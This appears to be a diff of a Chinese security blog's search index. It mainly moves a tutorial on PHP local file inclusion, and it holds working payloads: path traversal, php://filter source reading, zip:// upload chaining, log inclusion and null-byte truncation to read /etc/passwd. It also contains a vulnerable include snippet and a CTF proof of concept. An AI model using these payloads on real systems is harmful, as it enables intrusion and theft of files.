-<li>显示模块</li>
-<li>按键输入模块</li>
-</ul>
-<hr>
-<ul>
-<li>USB转串口下载线</li>
-<li>ST-Link仿真器</li>
-</ul>
-<hr>
-<ul>
-<li>古老神灯闪烁实验</li>
-</ul>
-<hr>
-<hr>
-<h2 id="I-O口的应用"><a href="#I-O口的应用" class="headerlink" title="I/O口的应用"></a>I/O口的应用</h2><ul>
-<li>I/O口的”五器”</li>
-</ul>
-<blockquote>
-<p>1.输出数据寄存器(ODR)、输入引脚寄存器(IDR)、数据方向寄存器(DDR)、控制寄存器1(CR1)、控制寄存器2(CR2)</p>
-</blockquote>
-<ul>
-<li>当Px_DDRn为”1”,对应的Pxn配置为输出；当Px_DDRn为”0”,对应的Pxn配置为输入。</li>
-</ul>
-]]></content>
-  </entry>
-  <entry>
     <title>代码审计学习（一）</title>
     <url>/2019/11/02/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80)/</url>
     <content><![CDATA[<h2 id="代码审计学习（一）"><a href="#代码审计学习（一）" class="headerlink" title="代码审计学习（一）"></a>代码审计学习（一）</h2><h3 id="PHP核心配置"><a href="#PHP核心配置" class="headerlink" title="PHP核心配置"></a>PHP核心配置</h3><p><font color="green"><strong>首先需了解 PHP_INI_* 常量的定义</strong></font></p>
@@ -3141,8 +3141,8 @@ __destruct</code></pre><h3 id="属性权限"><a href="#属性权限" class="head
 <hr>
 ]]></content>
       <tags>
-        <tag>WEB安全</tag>
         <tag>CTF</tag>
+        <tag>WEB安全</tag>
         <tag>漏洞挖掘</tag>
         <tag>代码审计</tag>
       </tags>
@@ -3249,8 +3249,8 @@ intval()</code></pre><p><strong>3. PDO prepare 预编译</strong></p>
 <p><font color="purple"><strong>2. 验证码验证</strong></font></p>
 ]]></content>
       <tags>
-        <tag>WEB安全</tag>
         <tag>CTF</tag>
+        <tag>WEB安全</tag>
         <tag>漏洞挖掘</tag>
         <tag>代码审计</tag>
       </tags>
@@ -3406,100 +3406,8 @@ if (empty($_GET[&#39;id&#39;])) {
 <p>POC:</p>
 <pre><code>?id=a[0]=s878926199a //?id=a[0]=240610708</code></pre>]]></content>
       <tags>
-        <tag>WEB安全</tag>
         <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件包含之LFI学习</title>
-    <url>/2019/10/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B9%8BLFI%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<p>[TOC]</p>
-<h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><h3 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h3><p><strong>文件包含漏洞主要是由四种函数造成的</strong>：</p>
-<ol>
-<li>include()</li>
-<li>require()</li>
-<li>include_once()</li>
-<li>require_once()</li>
-</ol>
-<a id="more"></a>
-
-<ul>
-<li>用这四类函数包含文件时，文件会被当做PHP代码来执行</li>
-</ul>
-<p><strong>include和require的区别：</strong></p>
-<ol>
-<li>include是<strong>当代码执行到它所在行</strong>才开始包含文件，如果有错，仍继续执行下去</li>
-<li>require<strong>是当程序执行</strong>就立即包含文件，有错时会停止并发出警告</li>
-</ol>
-<p><strong>文件包含漏洞类型</strong></p>
-<ol>
-<li>本地文件包含（LFI）</li>
-<li>远程文件包含（RFI）<blockquote>
-<p>当php.ini中，设置allow_url_include=On,allow_url_fopen=on.即可执行远程代码</p>
-</blockquote>
-</li>
-</ol>
-<hr>
-<h3 id="判断方法"><a href="#判断方法" class="headerlink" title="判断方法"></a>判断方法</h3><ul>
-<li><strong>从URL判断</strong><br>URL中path、dir、file、page、p、eng等等都可能存在文件包含漏洞<pre><code>http://www.example.com/?file=xxx.php</code></pre></li>
-</ul>
-<hr>
-<h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p><strong>1. 直接修改参数</strong></p>
-<pre><code>&lt;?php
-    if(isset($_GET[&#39;file&#39;])
-    {
-        include &#39;$_GET[&#39;file&#39;]&#39;;
-    }else{
-        include &#39;index.php&#39;；
-    }
-?&gt;</code></pre><p>比如网站的url为：</p>
-<pre><code>http://www.example.com/?file=index.php</code></pre><p>将<strong>index.php</strong>改为<strong>flag.php</strong></p>
-<pre><code>http://www.example.com/?file=flag.php</code></pre><p>即可输出<strong>flag.php</strong>的内容</p>
-<p>也可将<strong>?file=index.php</strong>改为<strong>../xxx.php</strong></p>
-<pre><code>http://www.example.com/?file=../xxx.php</code></pre><p>即可返回<strong>上一级目录下</strong>的xxx.php文件的内容</p>
-<ul>
-<li><strong>既然这样,我们就可以使用./(当前目录)、../(上级目录)对整个目录进行遍历,也就可以获取敏感的文件</strong></li>
-</ul>
-<hr>
-<p><strong>2. 利用PHP伪协议</strong></p>
-<ul>
-<li><strong>php://input</strong></li>
-</ul>
-<p>php://input可以读取没有处理过的==POST==数据。<strong>但当enctype=’multipart/form-data’的时候php://input是无效的。</strong></p>
-<p><img src="https://images2017.cnblogs.com/blog/1274619/201711/1274619-20171109171422763-1355830569.png" alt="image"></p>
-<ul>
-<li><strong>php://filter</strong></li>
-</ul>
-<p>用它在没有特殊情况下可以进行任意文件的读取。一般与<strong>base64编码</strong>合用，以base64编码的格式来把源代码显示出来。</p>
-<p><strong>poc: php://filter/read=convert.base64-encode/resource=xxx.php</strong></p>
-<p>南邮的ctf题目(文件包含)为例<br><a href="http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php" target="_blank" rel="noopener">nctf文件包含</a></p>
-<ul>
-<li><strong>zip协议</strong></li>
-</ul>
-<p>关于zip协议：可配合<strong>文件上传漏洞</strong>打组合拳</p>
-<p><strong>利用方法：zip://test.jpg#dir/test.php</strong></p>
-<p><font color="green">先新建一个test.php,里面写个phpinfo,然后压缩成.zip,然后把zip的名字改成test.jpg后把这个jpg文件上传上去 然后使用zip协议包含.</font></p>
-<hr>
-<p><strong>3. 包含系统的各种日志。</strong></p>
-<p>如apache日志，文件系统日志等。其中apache当记录格式为combined。再比如ngnix日志，默认路径为/var/log/ngnix/access.log</p>
-<p><a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">buuoj的一道ctf题</a></p>
-<p>……</p>
-<hr>
-<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><pre><code>&lt;?php
-    include $_GET[&#39;page&#39;].&quot;.php&quot;;
-
-?&gt;</code></pre><p>以上代码是防御LFI漏洞的其中一种方式<br>绕过方式也很简单</p>
-<p><strong>1. 00截断</strong></p>
-<p>(1) /etc/passwd%00,访问文件</p>
-<p>(2) %00目录遍历</p>
-<p><strong>2. 使用长目录截断</strong><br>/etc/passwd/././././././.[……]/./././././.<br>(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)</p>
-<blockquote>
-<p>截断要考虑两个问题magic_quotes_gpc（）和PHP版本（5.3.4以下）。</p>
-</blockquote>
-]]></content>
-      <tags>
         <tag>WEB安全</tag>
-        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -3786,6 +3694,98 @@ location=&#39;login.php&#39;;
       <tags>
         <tag>WEB安全</tag>
         <tag>漏洞挖掘</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件包含之LFI学习</title>
+    <url>/2019/10/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B9%8BLFI%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<p>[TOC]</p>
+<h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><h3 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h3><p><strong>文件包含漏洞主要是由四种函数造成的</strong>：</p>
+<ol>
+<li>include()</li>
+<li>require()</li>
+<li>include_once()</li>
+<li>require_once()</li>
+</ol>
+<a id="more"></a>
+
+<ul>
+<li>用这四类函数包含文件时，文件会被当做PHP代码来执行</li>
+</ul>
+<p><strong>include和require的区别：</strong></p>
+<ol>
+<li>include是<strong>当代码执行到它所在行</strong>才开始包含文件，如果有错，仍继续执行下去</li>
+<li>require<strong>是当程序执行</strong>就立即包含文件，有错时会停止并发出警告</li>
+</ol>
+<p><strong>文件包含漏洞类型</strong></p>
+<ol>
+<li>本地文件包含（LFI）</li>
+<li>远程文件包含（RFI）<blockquote>
+<p>当php.ini中，设置allow_url_include=On,allow_url_fopen=on.即可执行远程代码</p>
+</blockquote>
+</li>
+</ol>
+<hr>
+<h3 id="判断方法"><a href="#判断方法" class="headerlink" title="判断方法"></a>判断方法</h3><ul>
+<li><strong>从URL判断</strong><br>URL中path、dir、file、page、p、eng等等都可能存在文件包含漏洞<pre><code>http://www.example.com/?file=xxx.php</code></pre></li>
+</ul>
+<hr>
+<h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p><strong>1. 直接修改参数</strong></p>
+<pre><code>&lt;?php
+    if(isset($_GET[&#39;file&#39;])
+    {
+        include &#39;$_GET[&#39;file&#39;]&#39;;
+    }else{
+        include &#39;index.php&#39;；
+    }
+?&gt;</code></pre><p>比如网站的url为：</p>
+<pre><code>http://www.example.com/?file=index.php</code></pre><p>将<strong>index.php</strong>改为<strong>flag.php</strong></p>
+<pre><code>http://www.example.com/?file=flag.php</code></pre><p>即可输出<strong>flag.php</strong>的内容</p>
+<p>也可将<strong>?file=index.php</strong>改为<strong>../xxx.php</strong></p>
+<pre><code>http://www.example.com/?file=../xxx.php</code></pre><p>即可返回<strong>上一级目录下</strong>的xxx.php文件的内容</p>
+<ul>
+<li><strong>既然这样,我们就可以使用./(当前目录)、../(上级目录)对整个目录进行遍历,也就可以获取敏感的文件</strong></li>
+</ul>
+<hr>
+<p><strong>2. 利用PHP伪协议</strong></p>
+<ul>
+<li><strong>php://input</strong></li>
+</ul>
+<p>php://input可以读取没有处理过的==POST==数据。<strong>但当enctype=’multipart/form-data’的时候php://input是无效的。</strong></p>
+<p><img src="https://images2017.cnblogs.com/blog/1274619/201711/1274619-20171109171422763-1355830569.png" alt="image"></p>
+<ul>
+<li><strong>php://filter</strong></li>
+</ul>
+<p>用它在没有特殊情况下可以进行任意文件的读取。一般与<strong>base64编码</strong>合用，以base64编码的格式来把源代码显示出来。</p>
+<p><strong>poc: php://filter/read=convert.base64-encode/resource=xxx.php</strong></p>
+<p>南邮的ctf题目(文件包含)为例<br><a href="http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php" target="_blank" rel="noopener">nctf文件包含</a></p>
+<ul>
+<li><strong>zip协议</strong></li>
+</ul>
+<p>关于zip协议：可配合<strong>文件上传漏洞</strong>打组合拳</p>
+<p><strong>利用方法：zip://test.jpg#dir/test.php</strong></p>
+<p><font color="green">先新建一个test.php,里面写个phpinfo,然后压缩成.zip,然后把zip的名字改成test.jpg后把这个jpg文件上传上去 然后使用zip协议包含.</font></p>
+<hr>
+<p><strong>3. 包含系统的各种日志。</strong></p>
+<p>如apache日志，文件系统日志等。其中apache当记录格式为combined。再比如ngnix日志，默认路径为/var/log/ngnix/access.log</p>
+<p><a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">buuoj的一道ctf题</a></p>
+<p>……</p>
+<hr>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><pre><code>&lt;?php
+    include $_GET[&#39;page&#39;].&quot;.php&quot;;
+
+?&gt;</code></pre><p>以上代码是防御LFI漏洞的其中一种方式<br>绕过方式也很简单</p>
+<p><strong>1. 00截断</strong></p>
+<p>(1) /etc/passwd%00,访问文件</p>
+<p>(2) %00目录遍历</p>
+<p><strong>2. 使用长目录截断</strong><br>/etc/passwd/././././././.[……]/./././././.<br>(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)</p>
+<blockquote>
+<p>截断要考虑两个问题magic_quotes_gpc（）和PHP版本（5.3.4以下）。</p>
+</blockquote>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>WEB安全</tag>
       </tags>
   </entry>
 </search>
